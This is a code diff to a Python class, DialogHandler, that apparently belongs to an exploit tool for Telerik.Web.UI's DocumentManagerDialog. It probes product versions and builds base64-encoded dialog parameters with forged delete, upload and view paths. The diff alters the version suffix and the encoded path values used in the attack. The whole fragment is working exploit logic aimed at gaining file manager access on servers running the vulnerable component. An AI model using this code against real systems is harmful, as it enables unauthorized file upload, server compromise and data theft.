@@ -387,15 +387,13 @@ class DialogHandler:
         if hasattr(self, "debug") and self.debug:
             print(f"\n[DEBUG] Probing version: {version}")
 
-        # Add .45 to the version for proper DialogTypeName construction
-        version_with_build = f"{version}.45"
-        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version_with_build}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
         b64section = base64.b64encode(b64section_plain.encode()).decode()
 
         # Critical split between modern (2018+) and legacy dialog parameters
         if hasattr(self, "modern_dialog_params") and self.modern_dialog_params:
             # Modern format (2018+) with additional properties and different paths
-            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk5RWIyTjFiV1Z1ZEhNPQ==;EnableEmbeddedBaseStylesheet,False,3,True;StyleManagerProperties,False,0,;RenderMode,False,2,2;UploadPaths,True,0,Zmk5RWIyTjFiV1Z1ZEhNPQ==;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,5000000;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk5RWIyTjFiV1Z1ZEhNPQ==;IsSkinTouch,False,3,False;ScriptManagerProperties,False,0,CkZhbHNlCgoKRmFsc2UKMAoKCgo=;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,True"
+            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;StyleManagerProperties,False,0,;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,5000000;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ScriptManagerProperties,False,0,CkZhbHNlCgoKRmFsc2UKMAoKCgo=;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,True"
         else:
             # Legacy format (pre-2018) with original paths and parameters
             plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
